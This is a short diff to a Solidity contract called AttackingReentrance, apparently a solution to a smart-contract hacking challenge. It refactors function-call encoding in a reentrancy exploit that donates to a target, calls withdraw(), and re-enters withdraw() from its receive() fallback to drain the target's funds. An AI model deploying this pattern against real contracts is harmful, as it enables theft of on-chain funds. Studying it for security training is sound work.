@@ -12,23 +12,18 @@ contract AttackingReentrance {
     function hackContract() external {
         (bool donateSucces, ) = contractAddress.call{
             value: address(this).balance
-        }(
-            abi.encodeWithSelector(
-                bytes4(keccak256("donate(address)")),
-                address(this)
-            )
-        );
+        }(abi.encodeWithSignature("donate(address)", address(this)));
         require(donateSucces, "failed to donate");
 
         (bool withdrawSuccess, ) = contractAddress.call(
-            abi.encodeWithSelector(bytes4(keccak256("withdraw()")))
+            abi.encodeWithSignature("withdraw()")
         );
         require(withdrawSuccess, "failed to withdraw");
     }
 
     receive() external payable {
         (bool withdrawSuccess, ) = contractAddress.call(
-            abi.encodeWithSelector(bytes4(keccak256("withdraw()")))
+            abi.encodeWithSignature("withdraw()")
         );
         require(withdrawSuccess, "failed to withdraw");
     }
